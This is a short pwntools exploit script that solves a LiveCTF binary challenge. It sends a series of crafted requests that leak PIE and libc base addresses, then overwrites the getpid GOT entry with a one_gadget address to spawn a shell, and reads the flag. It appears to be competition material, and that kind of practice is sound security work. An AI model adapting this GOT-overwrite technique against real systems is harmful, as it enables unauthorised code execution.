#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
# context.log_level = 1

def pt(num, addr, data, more=True):
    p.sendlineafter("send?\n", str(hex(num)))
    p.sendlineafter("want?\n", str(hex(addr)))
    p.sendlineafter("data?\n", str(hex(data)))
    result = p.recvline().strip().split()
    if more:
        p.sendlineafter(")?\n", str(1))
    else:
        p.sendlineafter(")?\n", str(0))
    return result

p = remote(HOST, int(PORT))
# p = process("../handout/challenge")
x = pt(3, 8, 0)
pie_base = int(x[2], 16)
print(hex(pie_base))
x = pt(3, 0x80, 0)
libc_base = int(x[2], 16) - 0xeabc7
print(hex(libc_base))

getpid_got = pie_base + 0x220

print(hex(getpid_got))
x = pt(1, (getpid_got), 0)
print(x)

one_gadget =  libc_base + 0xebcf8
print(pt(4, getpid_got, one_gadget))

pt(7, 0, 0, False) # CONT!!!!
p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
